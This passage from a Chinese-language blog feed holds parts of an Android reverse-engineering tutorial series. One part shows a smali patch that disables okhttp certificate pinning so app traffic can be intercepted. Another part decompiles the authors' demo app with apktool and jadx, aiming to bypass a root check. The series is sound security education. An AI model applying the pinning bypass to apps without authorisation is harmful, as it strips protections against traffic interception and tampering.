class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Lokhttp3</span><span class=\"token operator\">/</span><span class=\"token class-name\">CertificatePinner</span>$<span class=\"token class-name\">Builder</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">5</span></code></pre>\n<p>這個就是 okhttp 在處理新增 certificate pinner 時的方法，我們只要這樣改就好了：</p>\n<pre class=\"language-java\"><code class=\"language-java\"># virtual methods<br><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> varargs <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Lokhttp3</span><span class=\"token operator\">/</span><span class=\"token class-name\">CertificatePinner</span>$<span class=\"token class-name\">Builder</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">5</span><br><br>    # patch<br>    <span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string p1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"abc\"</span></code></pre>\n<p>這樣第一個參數（domain）就永遠是 abc，永遠不會生效。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>這篇文章中我們學習到了如何自己動手改造 app，拿掉一些防中間人攻擊的機制，例如說改掉 network security config 以及程式碼中處理 certificate pinning 的部分。</p>\n<p>對於一般的 app 來說，做到這邊應該就滿夠的了，至少能夠監聽流量，看見 app 到底發送了些什麼。而且跟 VPN 的解法相比，還有另外一個好處，那就是可以二次打包，包出一個把 API 網址換掉也能動的版本，自由度比較高。</p>\n<p>在下一篇裡面，我們會學習另外一種分析 app 的方式。</p>\n<p>系列文連結：</p>\n<ol>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-1/\">Android App 逆向入門之一：拆開與重組 apk</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-2/\">Android App 逆向入門之二：修改 smali 程式碼</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-3/\">Android App 逆向入門之三：監聽 app 封包</a> - 你在這篇</li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-4/\">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li>\n</ol>\n",
      "date_published": "2022-02-21T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/android-apk-decompile-intro-2/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/android-apk-decompile-intro-2/",
      "title": "Android App 逆向入門之二：修改 smali 程式碼",
      "content_html": "<!-- summary -->\n<p>在第一篇當中我們學到了基礎中的基礎，靠著 Apktool 把 apk 拆開，修改資源以後組裝回去，並且把對齊且簽署過的 apk 裝回手機上面。</p>\n<p>而接下來的這一篇，我們要來看看如何修改程式碼。</p>\n<!-- summary -->\n<p>我們的目的是在一台有 root 的手機上繞過檢查，讓 app 顯示沒有 root。如果你是用沒有 root 的手機來測試的話，你可以反過來，將 app 改成會偵測出你有 root。</p>\n<p>系列文連結：</p>\n<ol>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-1/\">Android App 逆向入門之一：拆開與重組 apk</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-2/\">Android App 逆向入門之二：修改 smali 程式碼</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-3/\">Android App 逆向入門之三：監聽 app 封包</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-4/\">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li>\n</ol>\n<h2 id=\"%E4%BB%80%E9%BA%BC%E6%98%AF-smali\"><a class=\"direct-link\" href=\"#%E4%BB%80%E9%BA%BC%E6%98%AF-smali\">#</a> 什麼是 Smali</h2>\n<p>在我們利用 <code>apktool d</code> 拆開的內容中，有一個資料夾叫做 smali，裡面存放著的就是從 classes.dex 還原出來的東西，也就是程式碼。但這些程式碼跟你想的可能不太一樣，例如說我們可以來看看 <code>smali/com/cymetrics/demo/MainActivity.smali</code>：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token keyword\">public</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">.</span><span class=\"token keyword\">super</span> <span class=\"token class-name\">Landroidx</span><span class=\"token operator\">/</span>appcompat<span class=\"token operator\">/</span>app<span class=\"token operator\">/</span><span class=\"token class-name\">AppCompatActivity</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">.</span>source <span class=\"token string\">\"MainActivity.java\"</span><br><br><br># direct methods<br><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> constructor <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>init<span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">0</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">16</span><br>    invoke<span class=\"token operator\">-</span>direct <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroidx</span><span class=\"token operator\">/</span>appcompat<span class=\"token operator\">/</span>app<span class=\"token operator\">/</span><span class=\"token class-name\">AppCompatActivity</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>init<span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">return</span><span class=\"token operator\">-</span><span class=\"token keyword\">void</span><br><span class=\"token punctuation\">.</span>end method<br><br><br># virtual methods<br><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">protected</span> <span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>os<span class=\"token operator\">/</span><span class=\"token class-name\">Bundle</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">1</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">20</span><br>    invoke<span class=\"token operator\">-</span><span class=\"token keyword\">super</span> <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroidx</span><span class=\"token operator\">/</span>appcompat<span class=\"token operator\">/</span>app<span class=\"token operator\">/</span><span class=\"token class-name\">AppCompatActivity</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>os<span class=\"token operator\">/</span><span class=\"token class-name\">Bundle</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">const</span> p1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7f0b001c</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">21</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">setContentView</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">I</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">const</span> p1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7f080122</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">22</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">I</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><br><br>    move<span class=\"token operator\">-</span>result<span class=\"token operator\">-</span>object p1<br><br>    check<span class=\"token operator\">-</span>cast p1<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroidx</span><span class=\"token operator\">/</span>appcompat<span class=\"token operator\">/</span>widget<span class=\"token operator\">/</span><span class=\"token class-name\">Toolbar</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">23</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">setSupportActionBar</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroidx</span><span class=\"token operator\">/</span>appcompat<span class=\"token operator\">/</span>widget<span class=\"token operator\">/</span><span class=\"token class-name\">Toolbar</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">const</span> p1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7f08007a</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">25</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">I</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><br><br>    move<span class=\"token operator\">-</span>result<span class=\"token operator\">-</span>object p1<br><br>    check<span class=\"token operator\">-</span>cast p1<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>google<span class=\"token operator\">/</span>android<span class=\"token operator\">/</span>material<span class=\"token operator\">/</span>floatingactionbutton<span class=\"token operator\">/</span><span class=\"token class-name\">FloatingActionButton</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">26</span><br>    <span class=\"token keyword\">new</span><span class=\"token operator\">-</span>instance v0<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span>$<span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br><br>    invoke<span class=\"token operator\">-</span>direct <span class=\"token punctuation\">{</span>v0<span class=\"token punctuation\">,</span> p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span>$<span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>init<span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p1<span class=\"token punctuation\">,</span> v0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>google<span class=\"token operator\">/</span>android<span class=\"token operator\">/</span>material<span class=\"token operator\">/</span>floatingactionbutton<span class=\"token operator\">/</span><span class=\"token class-name\">FloatingActionButton</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">setOnClickListener</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span>$<span class=\"token class-name\">OnClickListener</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">return</span><span class=\"token operator\">-</span><span class=\"token keyword\">void</span><br><span class=\"token punctuation\">.</span>end method<br><br><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> <span class=\"token function\">onCreateOptionsMenu</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">Menu</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">2</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">38</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>cymetrics<span class=\"token operator\">/</span>demo<span class=\"token operator\">/</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">getMenuInflater</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">MenuInflater</span><span class=\"token punctuation\">;</span><br><br>    move<span class=\"token operator\">-</span>result<span class=\"token operator\">-</span>object v0<br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">/</span>high16 v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7f0c0000</span><br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v0<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">MenuInflater</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">inflate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ILandroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">Menu</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">/</span><span class=\"token number\">4</span> p1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x1</span><br><br>    <span class=\"token keyword\">return</span> p1<br><span class=\"token punctuation\">.</span>end method<br><br><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> <span class=\"token function\">onOptionsItemSelected</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">MenuItem</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">2</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">47</span><br>    invoke<span class=\"token operator\">-</span><span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">MenuItem</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">getItemId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">I</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">const</span> v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7f08003f</span><br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>ne v0<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_0<br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">/</span><span class=\"token number\">4</span> p1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x1</span><br><br>    <span class=\"token keyword\">return</span> p1<br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">54</span><br>    <span class=\"token operator\">:</span>cond_0<br>    invoke<span class=\"token operator\">-</span><span class=\"token keyword\">super</span> <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroidx</span><span class=\"token operator\">/</span>appcompat<span class=\"token operator\">/</span>app<span class=\"token operator\">/</span><span class=\"token class-name\">AppCompatActivity</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">onOptionsItemSelected</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">MenuItem</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result p1<br><br>    <span class=\"token keyword\">return</span> p1<br><span class=\"token punctuation\">.</span>end method<br></code></pre>\n<p>如果你覺得看起來不是很好閱讀，那是正常的。</p>\n<p>Smali 是跑在 Android Dalvik VM 上的 byte code，有著自己的一套語法規則，如果想要看到我們熟悉的 Java 程式碼，必須要將 smali 還原成 Java。</p>\n<h2 id=\"%E5%88%A9%E7%94%A8-jadx-%E9%82%84%E5%8E%9F%E5%87%BA-java-%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E5%88%A9%E7%94%A8-jadx-%E9%82%84%E5%8E%9F%E5%87%BA-java-%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> 利用 jadx 還原出 Java 程式碼</h2>\n<p>接著我們要用到另外一套工具：<a href=\"https://github.com/skylot/jadx\">jadx</a>，GitHub 上面它對自己的描述是：Dex to Java decompiler。</p>\n<p>安裝過程我一樣省略，接著我們用 jadx 把 apk 拆開：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token comment\"># -r 代表不要把 resource 拆開，因為我們只關注程式碼</span><br><span class=\"token comment\"># -d 代表目的地</span><br>jadx -r demoapp.apk -d jadx-demoapp</code></pre>\n<p>跑完以後就會看到多了一個 jadx-demoapp 的資料夾，我們點進去裡面的 <code>sources/com/cymetrics/demo/MainActivity.java</code>，可以看到如下內容：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>cymetrics<span class=\"token punctuation\">.</span>demo</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Bundle</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>view<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Menu</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>view<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">MenuItem</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>view<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">androidx<span class=\"token punctuation\">.</span>appcompat<span class=\"token punctuation\">.</span>app<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AppCompatActivity</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">androidx<span class=\"token punctuation\">.</span>appcompat<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Toolbar</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>material<span class=\"token punctuation\">.</span>floatingactionbutton<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FloatingActionButton</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>material<span class=\"token punctuation\">.</span>snackbar<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Snackbar</span><span class=\"token punctuation\">;</span><br><span class=\"token comment\">/* loaded from: classes.dex */</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MainActivity</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AppCompatActivity</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class=\"token annotation punctuation\">@Override</span> <span class=\"token comment\">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Bundle</span> bundle<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>bundle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token function\">setContentView</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>layout<span class=\"token punctuation\">.</span>activity_main<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token function\">setSupportActionBar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Toolbar</span><span class=\"token punctuation\">)</span> <span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>toolbar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FloatingActionButton</span><span class=\"token punctuation\">)</span> <span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>fab<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">View<span class=\"token punctuation\">.</span>OnClickListener</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// from class: com.cymetrics.demo.MainActivity.1</span><br>            <span class=\"token annotation punctuation\">@Override</span> <span class=\"token comment\">// android.view.View.OnClickListener</span><br>            <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onClick</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">View</span> view<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">Snackbar</span><span class=\"token punctuation\">.</span><span class=\"token function\">make</span><span class=\"token punctuation\">(</span>view<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Replace with your own action\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setAction</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">View<span class=\"token punctuation\">.</span>OnClickListener</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token annotation punctuation\">@Override</span> <span class=\"token comment\">// android.app.Activity</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">onCreateOptionsMenu</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Menu</span> menu<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">getMenuInflater</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">inflate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>menu<span class=\"token punctuation\">.</span>menu_main<span class=\"token punctuation\">,</span> menu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token annotation punctuation\">@Override</span> <span class=\"token comment\">// android.app.Activity</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">onOptionsItemSelected</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MenuItem</span> menuItem<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>menuItem<span class=\"token punctuation\">.</span><span class=\"token function\">getItemId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>action_settings<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">onOptionsItemSelected</span><span class=\"token punctuation\">(</span>menuItem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br></code></pre>\n<p>這才是我們想看到的內容嘛！因為這個 apk 沒有經過混淆，所以幾乎可以看到完整的 java 檔案，跟原始碼差不了多少。</p>\n<p>簡單講一下混淆（Obfuscation），混淆就是把程式碼打亂，讓人不容易看出來原本的程式碼是什麼，例如說把變數名字都換成 aa, bb, cc, dd 這種沒有意義的名稱之類的，就是最基本的混淆。在 Android 開發中通常透過 ProGuard 這個工具來做混淆。</p>\n<p>像上面那樣的程式碼很明顯就沒有混淆過，讓人很容易就能看出原本的邏輯。</p>\n<p>這次我們要來改動的程式碼在 <code>com/cymetrics/demo/FirstFragment.java</code>：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>cymetrics<span class=\"token punctuation\">.</span>demo</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span></span><span 